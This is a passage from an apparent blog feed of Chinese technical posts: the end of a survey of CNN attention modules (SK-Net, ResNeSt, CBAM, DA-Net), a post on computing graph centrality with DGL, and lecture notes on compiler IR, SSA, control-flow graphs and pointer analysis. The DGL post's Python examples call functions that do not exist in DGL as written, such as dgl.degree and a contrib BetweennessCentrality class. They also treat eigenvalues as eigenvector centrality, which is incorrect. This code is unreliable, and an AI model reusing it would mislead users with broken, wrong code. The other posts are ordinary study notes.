/><p>公式（4）表示最终的权重是<mark>综合了各个相邻通道的信息获得</mark>，其中σ为激活函数，yi代表通道，wi为通道yi的权重，Ω代表与yi相邻的k个通道，<mark>k的值是随着学习自适应变化的</mark>。为了实现这一想法，作者利用了一维卷积层来进行实现，通过核为k的一维卷积对通道与其相邻的k-1个通道信息进行综合，如公式（5）所示，C1Dk表示核为k的一维卷积操作，y表示通道。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651502.png" alt="image-20220711100235954"></p><h2 id="2多路注意力">2.多路注意力</h2><h4 id="sk-netselective-kernel-networks">SK-Net（Selective Kernel Networks）</h4><p>2019年，CVPR收录的论文中提出了SK-Net（Selective Kernel Networks），SK-Net<mark>基于卷积核的注意力机制</mark>，即卷积核的重要性，即不同的图像经过不同卷积核的重要性是不同的，其结构如图4所示。整个SK-Net结构由<mark>Split、Fuse、Select</mark>三部分组成[15]。Split的任务是将输入的<strong>特征图X进行不同卷积核大小的卷积操作</strong>。如图4所示，对X进行<strong>Kernel3×3和Kernel5×5</strong>的卷积操作，得到输出U1与U2。而在Fuse部分将对U1与U2进行element-wise summation，得到输出特征图U，<mark>通过全局平均池化与全连接层获取特征图的注意力信息</mark>，并创建了一个紧凑的特征z∈Rd×1，以便为精确和自适应选择提供指导如公式（6）所示，其中δ是ReLU函数，B表示批量标准化，W表示全连接层且W∈Rd×C。公式（7）表明为了研究d对模型效率的影响，文章使用<mark>下降参数r来控制其值</mark>，L表示d的最小值。在Select部分中，将这个紧凑特征z向量重新分为两个（本文情况）或多个（更多的情况）特征向量，然后分别与相应的split之后的特征图进行相应通道的相乘操作，然后再通过这种加权共同构成输入到下一个神经元的特征向量。两个特征向量ac、bc的生成如公式（8）、（9）所示，其中A,B∈RC×d,a、b分别表示U1与U2的注意力向量，Ac∈R1×d表示A的第c行，ac表示a的第c个元素值，对于向量B同理。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651515.png" alt="image-20220711104648704" style="zoom:80%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651508.png" alt="image-20220711104719907" style="zoom:80%;" /><h4 id="resnest">ResNeSt</h4><p>2020年，亚马逊、加州大学戴维斯分校的张航、李沐、 Smola等研究者进一步改进了 ResNet[16]（Deep Residual Network），提出了ResNeSt，其中利用ResNet、SE-Net与SKNet的思想，提出了 <mark>Split- Attention block</mark>[17]。在 ResNeSt block中，整体大框架运用了残差网络的结构，通过将网络的输入 Input输入 k个 Cardinal分支当中，公式（10）表 述了每个 Cardinal的输入，其中 R代表每个 Cardinal中 split后的分支数，k代表第 k个 Cardinal，U代表着 split 后每个分支的输入。公式（11）表述了每个 Cardinal模块 的输出，V代表携带了通道权重的 Cardinal输出，a© 是由 softmax计算得到的权重，计算方法如公式（12）所 示，其中 G代表每个 split的权重。在经过 Cardinal模块 后对最后的 k个输出进行拼接，以达到综合 k个 Cardinal 输出信息的目的，如公式（13）所示，并将拼接后的输出 与原本的输入进行 element-wise summation，得到最后 的输出，其结构如图 5所示。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651521.png" alt="image-20220711172340306"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651028.png" alt="image-20220711172359420"></p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651074.png" alt="image-20220711104622217" style="zoom:80%;" /><p>在每个Cardinal中，又利用了SE-Net与SK-Net的思想，使用Split模块对每个Cardinal的输入切分为r个分支，通过SE-Net中的挤压激励操作获取每个分支的注意力信息作为Fuse模块，最后在Select模块中使得具有注意力信息的向量与其对应的分支特征图相乘，并通过element-wisesummation综合r个分支的输出作为最终的Cardinal输出，Cardinal结构如图6所示。</p><h4 id="cbamconvolutional-block-attention-module">CBAM（Convolutional Block Attention Module）</h4><p>2018年，ECCV（European Conference on Computer Vision）收录的论文中提出了卷积注意力模块 CBAM （Convolutional Block Attention Module Network），它的创新在于，它==<strong>认为对于卷积网络中的特征图来说，不仅通道中蕴含着丰富的注意力信息[18]，通道内部，即特征图像素点间也具有大量的注意力信息，而以往的注意力机制只关注了通道上的注意力信息，这对于空间上的注意力信息是一种浪费</strong>==[19]。CBAM通过构建两个子模 块，==空间注意力模块 SAM（Spatial Attention Module）， 通道注意力模块 CAM（Channel Attention Module）==分别汇总空间和通道两方面的注意力信息，并将信息进行一定程度的综合，从而获得更全面可靠的注意力信息[20]，对计算资源的分配进行更合理的指导，其结构如图7所示。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651084.png" alt="image-20220711184905172" style="zoom:80%;" /><p>通道注意力模块将输入的特征图F(H×W×C)分别经过基于宽和高的global max pooling（全局最大池化）和global average pooling（全局平均池化），得到两个1×1×C的特征图，接着，再将它们分别送入一个两层的神经网络（MLP），第一层神经元个数为C/r（r为减少率），激活函数为Relu，第二层神经元个数为C，这个两层的神经网络是共享的。而后，将MLP输出的特征进行基于element-wise的加和操作，再经过sigmoid激活操作，生成最终的通道注意力特征，即公式（14）中的Mc(F)，其中Favg为特征图经过全局平均池化的结果，Fmax为经过全局最大池化的结果，整个通道门注意力模块结构如图8所示。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651096.png" alt="image-20220711185157839" style="zoom:80%;" /><p>空间注意力模块将通道注意力模块输出的特征图F作为本模块的输入特征图[21]。首先做一个基于通道的全局最大池化和全局平均池化，得到两个尺寸为H×W×1的特征图，然后将这两个特征图基于通道做拼接操作。然后经过一个7×7卷积操作，降维为H×W×1，再经过sigmoid生成空间注意力特征，即公式（15）中的Ms(F)，其中f代表卷积操作，[]代表通道拼接操作，最后将该向量和该模块的输入特征图做乘操作，得到最终生成的特征。整个空间注意力模块结构如图9所示。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651114.png" alt="image-20220711185251497" style="zoom:80%;" /><h4 id="双注意力网络dual-attention-network">双注意力网络（Dual Attention Network）</h4><p>2019年CVPR收录的论文中提出了DA-Net（Dual AttentionNetwork），==与CBAM相似的是，它的思想也是综合通道和空间两路的注意力信息，但不同的是CBAM的两路注意力信息的获取是串行的，而DA-Net中的两路注意力信息的获取是并行的，且获取注意力信息的方式也有很大差别。==DA-Net从通道与空间两个分支通过对特征图进行矩阵操作构建特征图的相关性矩阵S和X，两个矩阵分别用来表征通道之间的相关性和通道内像素点之间的相关性，用此矩阵对特征图的更新进行引导，增大关键特征的权重，使得将更多的注意力放在更易于进行区分的优秀特征之上。双注意力模块结构如图10所示。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651131.png" alt="image-20220711190049358" style="zoom:80%;" /><p>其中<mark>PAM（Position Attention Module）是空间分支</mark>，其结构如图11所示，CAM（ChannelAttentionModule）是通道分支，其结构如图12所示，这两个分支通过对于特征图的处理分别构建出了关于<mark>特征图通道与空间位置的相关性矩阵X</mark>（尺寸为C×C）与S（尺寸为(H×W)×(H×W))，其中H、W、C分别为特征图的高、宽与通道数，并用此两个相关性矩阵来引导特征图不同通道与空间位置权重的更新方向，DA-Net捕捉了空间和通道维度中的全局特征依赖关系，==使用位置注意力模块来学习特征的空间相互依赖性，==通道注意力模块来模拟通道相互依赖性[22]。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651265.png" alt="image-20220711190125197" style="zoom:80%;" /><h4 id="金字塔特征注意力网络pyramid-feature-attention-network">金字塔特征注意力网络（Pyramid Feature Attention Network）</h4><p>2019年CVPR收录的论文中提出了金字塔特征注意力网络==，同样是利用特征图在通道间与通道内部像素点都富含大量的注意力信息的思想==[23]，其结构如图13所示。其中CA模块（ChannelAttentionModule）为通道注意力模块，CA分支的结构与SE-Net的思想是相同的，都是通过全局平均池化提取通道注意力信息，利用全连接获取各个通道的权重，如图14所示，SA模块（SpatialAttentionModule）为空间注意力模块，它利用了交替的卷积核相同的卷积层来提取通道内部像素位置之间的注意力信息，获得通道内部不同像素位置之间的相关性与重要程度等信息[24]，其结构如图15所示。两个模块分别从通道与空间两个方向提取特征图中的注意力信息，提取不同通道与空间中不同像素位置的权重信息，并对特征图进行自适应的更新。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651331.png" alt="image-20220711190217722"></p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651360.png" alt="image-20220711190306707" style="zoom:80%;" /><h2 id="卷积网络中注意力机制展望">卷积网络中注意力机制展望</h2><p>近几年，注意力机制的思想被广泛应用在各种深度学习任务中，如计算机视觉、图像分割、自然语言处理等[25]。大量实验证明了注意力机制是行之有效且节省资源的，当注意力机制的思想运用于卷积神经网络中时，需要着眼于卷积网络中所特有的特征图中的关键信息。当前注意力机制的主流方法是将特征图中的潜在注意力信息进行深度挖掘，最常见的是通过各种手段获取各个特征图通道间的通道注意力信息与特征图内部像素点之间的空间注意力信息，获取的方法也包括但不仅限于卷积操作，矩阵操作构建相关性矩阵等，其共同的目的是更深层次、更全面地获取特征图中完善的注意力信息[26]，于是如何更深地挖掘，从哪里去挖掘特征图的注意力信息，将极有可能会成为未来注意力方法发展的方向之一。</p><p>目前，<mark>获取注意力的方法基本基于通道间的注意力信息、空间像素点之间的注意力信息和卷积核选择的注意力信息</mark>，是否能够从新的方向去获取特征图更丰富的注意力信息，或者<mark>以新的方式或手段去获取更精准的注意力信息</mark>也是未来需要关注的一个重点[27]。</p><p>ECA-Net论文中的实验证明了跨通道的信息交互对于注意力信息的获取是有积极作用的，这也从侧面验证了不同通道之间并不是相互独立的，其内部是存在许多有利的有价值的信息的[28]，那么着眼于不同通道内部的其他信息的提取，如不同特征图中像素点的空间注意力信息或其他跨通道信息是否对于获取更加精准的注意力分布有着正确的导向作用也是一个值得探索的方向[29]。</p><p>注意力机制作为一个轻量级的模块[30]，有着即插即用的特点，但是即使其本身参数量并不高[31]，在深度学习一些任务当中，注意力模块往往会被反复多次的调用，当注意力模块调用次数过多时仍然会对网络整体造成一定的负担[32]，如何优化模块结构，降低模块参数量或减少模块调用次数，更快地获取更精准的注意力信息，对于以后注意力机制在其他任务中的推广有着举足轻重的作用[33]，也是未来需要研究的重要内容之一。</p><p>卷积网络中的注意力机制的核心在于<mark>深度挖掘特征图中所含有的信息</mark>[34]，而目前所发现的注意力获取渠道相对较少，但是注意力机制已经被广泛证明其针对大量深度学习任务不仅具有参数量小[35]，即插即用的便捷性[36]，还可以较为明显地提升任务效果。说明未来对于注意力机制的深度研究是必要且意义非凡的[37]，将对深度学习任务产生重大的影响。</p><p>随着信息技术的不断发展，人类必将面临着大量而繁杂的信息，针对如此庞杂的信息去完成各项深度学习任务将变得更为困难[38]。当数据量无法任意改变的情况下，如何高效率地完成任务就变得尤为重要[39]。注意力机制便是提升深度学习任务效率的重要方法之一。当深度学习方法较为低效时，在深度学习任务中引入注意力机制将会实现“曲线救国”[40]，利用其低成本、高收益[41]的特点，大幅提升信息处理的效率，在未来的深度学习任务中大放异彩</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attention </tag>
            
            <tag> CNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DGL计算中心性</title>
      <link href="/2022/12/18/AILearning/GNN/DGL%E8%AE%A1%E7%AE%97%E4%B8%AD%E5%BF%83%E6%80%A7/"/>
      <url>/2022/12/18/AILearning/GNN/DGL%E8%AE%A1%E7%AE%97%E4%B8%AD%E5%BF%83%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>在DGL中，可以使用<code>dgl.degree</code>、<code>dgl.in_degree</code>和<code>dgl.out_degree</code>函数来计算图的度、入度和出度。此外，DGL还提供了一些其他库和函数来计算不同类型的中心性度量。以下是几种常见的中心性度量及其计算方法：</p><ul><li>度中心性（Degree Centrality）：度中心性衡量一个节点与图中其他节点之间的连接数量。可以使用<code>dgl.degree</code>函数计算节点的度。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dgl</span><br><span class="line"><span class="comment"># 创建图</span></span><br><span class="line">g = dgl.graph(([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))</span><br><span class="line"><span class="comment"># 计算节点的度中心性</span></span><br><span class="line">degree_centrality = dgl.degree(g).<span class="built_in">float</span>() / (g.number_of_nodes() - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Degree Centrality:&quot;</span>, degree_centrality)</span><br></pre></td></tr></table></figure><ul><li>介数中心性（Betweenness Centrality）：介数中心性衡量一个节点在图中的最短路径中充当桥梁的频率。可以使用<code>dgl.contrib.sampling.sampler.BetweennessCentrality</code>类来计算介数中心性。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dgl</span><br><span class="line"><span class="keyword">import</span> dgl.contrib.sampling.sampler <span class="keyword">as</span> sampler</span><br><span class="line"><span class="comment"># 创建图</span></span><br><span class="line">g = dgl.graph(([<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>]))</span><br><span class="line"><span class="comment"># 计算节点的介数中心性</span></span><br><span class="line">betweenness_centrality = sampler.BetweennessCentrality()(g)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Betweenness Centrality:&quot;</span>, betweenness_centrality)</span><br></pre></td></tr></table></figure><ul><li>接近中心性（Closeness Centrality）：接近中心性衡量一个节点与图中其他节点之间的平均最短路径长度。可以使用<code>dgl.contrib.sampling.sampler.ClosenessCentrality</code>类来计算接近中心性。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dgl</span><br><span class="line"><span class="keyword">import</span> dgl.contrib.sampling.sampler <span class="keyword">as</span> sampler</span><br><span class="line"><span class="comment"># 创建图</span></span><br><span class="line">g = dgl.graph(([<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>]))</span><br><span class="line"><span class="comment"># 计算节点的接近中心性</span></span><br><span class="line">closeness_centrality = sampler.ClosenessCentrality()(g)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Closeness Centrality:&quot;</span>, closeness_centrality)</span><br></pre></td></tr></table></figure><ul><li>特征向量中心性（Eigenvector Centrality）：特征向量中心性衡量一个节点在图中的重要性，取决于它与其他重要节点的连接程度。可以使用<code>torch.eig</code>函数计算特征值和特征向量，然后提取特征值中的实部作为特征向量中心性的度量。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dgl</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="comment"># 创建图</span></span><br><span class="line">g = dgl.graph(([<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>]))</span><br><span class="line"><span class="comment"># 计算节点的特征向量中心性</span></span><br><span class="line">eigenvalues, eigenvectors = torch.eig(g.adjacency_matrix().to_dense(), eigenvectors=<span class="literal">True</span>)</span><br><span class="line">eigenvector_centrality = eigenvalues[:, <span class="number">0</span>].real</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Eigenvector Centrality:&quot;</span>, eigenvector_centrality)</span><br></pre></td></tr></table></figure><p>请注意，在计算特征向量中心性时，我们将图的邻接矩阵转换为稠密矩阵，然后使用<code>torch.eig</code>函数计算特征值和特征向量。这可能在处理大型图时导致内存问题，因此需要根据具体情况进行调整。</p>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DGL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IR分析</title>
      <link href="/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-IR/"/>
      <url>/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-IR/</url>
      
        <content type="html"><![CDATA[<h3 id="目录">目录：</h3><ol><li>编译器和静态分析的关系</li><li>AST vs IR</li><li>IR:3-地址代码（3AC）</li><li>实际静态分析器的3AC—Soot（Java）</li><li>SSA-静态单赋值</li><li>基本块（BB）</li><li>控制流图（CFG）</li></ol><h2 id="1编译器和静态分析的关系">1.编译器和静态分析的关系</h2><p>源码-&gt;（Scanner - 词法Lexical分析-Regular Expression）-&gt;（Parser- 语法Syntax分析-Context-Free Grammar）， 生成AST -&gt;（Type Checker - 语义Semantic分析 - Attribute Grammar），生成 Decorated AST  -&gt; Translator，生成IR，进行静态分析 -&gt; Code Generator</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241015129.webp" alt="img"></p><p>1-1-编译器原理.png</p><h2 id="2ast-vs-ir">2.AST vs IR</h2><p><strong>AST</strong> ：高级，更接近于语法结构，依赖于语言种类，适用于快速类型检查，缺少控制流信息</p><p><strong>IR</strong>：低级，更接近于机器码，不依赖语言种类，压缩且简洁，包含控制流信息。是静态分析的基础</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241015072.webp" alt="img"></p><p>1-2-AST&amp;IR.png</p><h2 id="3ir3-地址代码3ac">3.IR:3-地址代码（3AC）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最多1个操作符</span></span><br><span class="line">a+b+<span class="number">3</span>  -&gt;  t1 = a+b</span><br><span class="line">                 t2 = t1+<span class="number">3</span></span><br><span class="line">Address：</span><br><span class="line">    Name:a、b</span><br><span class="line">    Constant: <span class="number">3</span></span><br><span class="line">    编译器的临时变量：t1、t2</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241015124.webp" alt="img"></p><p>1-3-常用3地址码.png</p><h2 id="4实际静态分析器的3acsootjava">4.实际静态分析器的3AC—Soot（Java）</h2><p>Soot-常用的Java静态分析框架</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java IR（Jimple）基本知识</span></span><br><span class="line">invokespecial：call constructor, call superclass methods, call <span class="keyword">private</span> methods</span><br><span class="line">invokevirtual: instance methods <span class="title function_">call</span> <span class="params">(virtual dispatch)</span></span><br><span class="line">invokeinterface: cannot optimization, checking <span class="keyword">interface</span> <span class="title class_">implementation</span></span><br><span class="line">invokestation:call <span class="keyword">static</span> methods</span><br><span class="line"></span><br><span class="line">Java <span class="number">7</span>: invokedynamic -&gt; Java <span class="keyword">static</span> typing, dynamic language runs on JVM</span><br><span class="line"></span><br><span class="line">method signature: <span class="keyword">class</span> <span class="title class_">name</span>, <span class="keyword">return</span> type, method <span class="title function_">name</span><span class="params">(parameter1 type, parameter2 type)</span></span><br></pre></td></tr></table></figure><h2 id="5ssa-静态单赋值">5.SSA-静态单赋值</h2><p><strong>定义</strong>：给每一个定义变量一个新的名字，传递到接下来的使用当中，每个变量有1个定义（赋值的目标变量）。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241015273.webp" alt="img"></p><p>1-4-SSA.png</p><p><strong>优点</strong>：唯一的变量名可以间接体现程序流信息，简化分析过程；清楚的Define-Use信息。</p><p><strong>缺点</strong>：引入很多变量和phi-function；转换为机器码时效率变低（引入很多拷贝操作）。</p><h2 id="6基本块bb">6.基本块（BB）</h2><p><strong>定义</strong>：只有1个开头入口和1个结尾出口的最长3-地址指令序列。</p><p><strong>识别基本块的算法</strong>：首先确定入口指令，第一条指令是入口；任何跳转指令的目标地址是入口；任何跟在跳转指令之后的指令是入口。然后构造基本块，任何基本块包含1个入口指令和其接下来的指令。</p><p><strong>我的想法</strong>：对于下1条指令，若该指令不是入口，则可以加入；若该指令有多个出口，则停止加入，否则继续判断下一条指令。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241015127.webp" alt="img"></p><p>1-5-基本块算法.png</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241015902.png" alt="image-20210507093627625"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241015392.png" alt="image-20210507094011702"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241015444.png" alt="image-20210507093932573"></p><h2 id="7控制流图cfg">7.控制流图（CFG）</h2><p><strong>控制流边</strong>：基本块A的结尾有跳转指令跳转到基本块B；原始指令序列中，B紧跟着A，且A的结尾不是无条件跳转。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241015647.webp" alt="img"></p><p>1-6-控制流边.png</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241015485.png" alt="image-20210507094447334"></p><p>添加Entry / Exit：没有块跳转到该块 / 没有跳转到其他块。</p><p>作者：bsauce<br>链接：<a href="https://www.jianshu.com/p/acb73f72cf46">https://www.jianshu.com/p/acb73f72cf46</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
      
      
      <categories>
          
          <category> 软件分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针分析</title>
      <link href="/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90/"/>
      <url>/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="目录">目录：</h3><ol><li>Motivation</li><li>指针分析介绍</li><li>影响指针分析的关键要素</li><li>分析哪些语句</li></ol><h3 id="重点">重点：</h3><p>什么是指针分析？影响指针分析的关键因素是什么？指针分析要分析哪些指令？</p><hr><h1 id="1motivation">1.Motivation</h1><p><strong>指针分析必要性</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012597.webp" alt="img"></p><p>6-1-PTA-motivation.png</p><hr><h1 id="2指针分析">2.指针分析</h1><p><strong>目标</strong>：分析程序指针可以指向哪些内存。对于Java等面向对象语言，主要分析指针指向哪个对象。</p><p><strong>说明</strong>：指针分析属于<mark>may analysis</mark>，分析的结果是某指针所有可能指向哪些对象，是个<mark>over-approximation</mark>集合。</p><p><strong>示例</strong>：面向对象语言中的指针指向问题。对于setB()函数，this指向<code>new A()</code>，因为是调用者是a.setB()；setB()中的b是x传过来的，所以b指向new B()，A.b指向 new B()。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012589.webp" alt="img"></p><p>6-2-1-PTA示例.png</p><p><strong>区别</strong>：</p><ul><li>指针分析：<strong>分析指针所有可能指向的对象</strong>。</li><li>别名分析：<strong>分析两个指针是否指向相同的对象</strong>，可通过指针分析来推导得到。</li></ul><p><strong>应用</strong>：基本信息（别名分析/调用图），编译优化（嵌入虚拟调用），漏洞（空指针），安全分析（信息流）。</p><hr><h1 id="3影响指针分析的关键要素">3.影响指针分析的关键要素</h1><p><strong>指标</strong>：精度（precision）&amp; 效率（efficiency）。</p><p><strong>影响因素</strong>：本课程，我们主要分析分配点的堆抽象技术、上下文敏感/不敏感、流敏感/不敏感、全程序分析。</p><table><thead><tr><th>因素</th><th>问题</th><th>选项</th></tr></thead><tbody><tr><td>Heap abstraction</td><td>如何建模堆内存？</td><td>• <strong>Allocation-site</strong>        • Storeless</td></tr><tr><td>Context sensitivity</td><td>如何建模调用上下文？</td><td>• <strong>Context-sensitive</strong>     • <strong>Context-insensitive</strong></td></tr><tr><td>Flow sensitivity</td><td>如何建模控制流？</td><td>• Flow-sensitive     • <strong>Flow-insensitive</strong></td></tr><tr><td>Analysis scope</td><td>分析哪部分程序？</td><td>• <strong>Whole-program</strong>    • Demand-driven</td></tr></tbody></table><h4 id="1堆抽象内存建模">（1）堆抽象（内存建模）</h4><p><strong>问题</strong>：程序动态执行时，堆对象个数理论上是无穷无尽的，但静态分析无法处理这个问题。所以为保证指针分析可以终止，我们采用堆抽象技术，将无穷的具体对象抽象成有限的抽象对象。也即，将有共性的对象抽象成1个静态对象，从而限制静态分析对象的个数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例</span></span><br><span class="line"><span class="keyword">for</span> (...) &#123;</span><br><span class="line">    A a = new A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>技术概览</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012594.webp" alt="img"></p><p>6-3-1-堆抽象技术概览.png</p><p>我们只学习<code>Allocation-Site</code>(分配，定位点)技术，最常见也最常被使用。</p><p><strong><code>Allocation-Site</code>原理</strong>：将动态对象抽象成它们的创建点（<code>Allocation-Site</code>），来表示在该点创建的所有动态对象。<code>Allocation-Site</code>个数是有限的。</p><p><strong>示例</strong>：循环创建了3个对象，我们用O2来抽象表示这3个动态对象。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012580.webp" alt="img"></p><p>6-3-2-堆抽象示例.png</p><h4 id="2上下文敏感-context-sensitivity">（2）上下文敏感 Context Sensitivity</h4><p><strong>问题</strong>：考虑是否区分不同call-site对同一函数的调用。</p><ul><li><p>Context-sensitive：根据某函数调用上下文的不同，多次分析同一函数。</p></li><li><p>Context-insensitive：每个函数只分析一次。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012569.webp" alt="img"></p><p>6-3-3-上下文敏感示例.png</p></li></ul><h4 id="3流敏感-flow-sensitivity">（3）流敏感 Flow Sensitivity</h4><p><strong>问题</strong>：考虑语句顺序（控制流）的影响  vs 把程序当做无序语句的集合。</p><p><strong>方法</strong>：<strong>流敏感会在每个程序点都保存一份指针指向关系映射，而流不敏感则对整个程序保存一份指向关系映射。</strong></p><p><strong>说明</strong>：目前流敏感对Java提升不大，不过在C中很有效，本课程分析的是Java，所以重点讨论流不敏感技术。</p><p><strong>指针分析示例</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012567.webp" alt="img"></p><p>6-3-4-流敏感示例.png</p><h4 id="4分析范围-analysis-scope">（4）分析范围 Analysis Scope</h4><p><strong>问题</strong>：分析程序的哪一部分？</p><ul><li>Whole-program 全程序：分析全程序的指向关系。</li><li>Demand-driven 需求驱动：只分析影响特定域的指针的指向关系。</li></ul><hr><h1 id="4分析哪些语句">4.分析哪些语句</h1><p><strong>问题</strong>：哪些语句会影响指针指向，那就只分析这些语句。</p><p><strong>Java指针类型</strong>：</p><ol><li><p><strong>Lacal variable: x</strong></p></li><li><p>Static field:C.f   （有时称为全局变量）——不分析</p></li><li><p><strong>Instance field: x.f</strong>    （对象的field）</p></li><li><p>Array element: array[i]  ——不分析，因为静态分析无法确定下标，所以将array中所有成员映射到一个field中，等价于<strong>Instance field</strong>，所以不重复分析。如下图所示：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012902.webp" alt="img"></p><p>6-4-1-数组处理.png</p></li></ol><p><strong>影响指针指向的语句</strong>：</p><ol><li>New:      x = new T()</li><li>Assign：x = y</li><li>Store：  x.f = y</li><li>Load：   y = x.f</li><li>Call：     r = x.k(a,…)<ul><li>Static call：    C.foo()</li><li>Special call： super.foo() / x.<init>() / this.privateFoo()</li><li><strong>Virtual call</strong>：x.foo()</li></ul></li></ol><p>复杂的内存访问可以通过引入临时变量，转化为三地址代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x.f.g.h = y;</span><br><span class="line"><span class="comment">// 转化为</span></span><br><span class="line">t1 = x.f;</span><br><span class="line">t2 = t1.g;</span><br><span class="line">t2.h = y;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件分析 </tag>
            
        </tags>
      
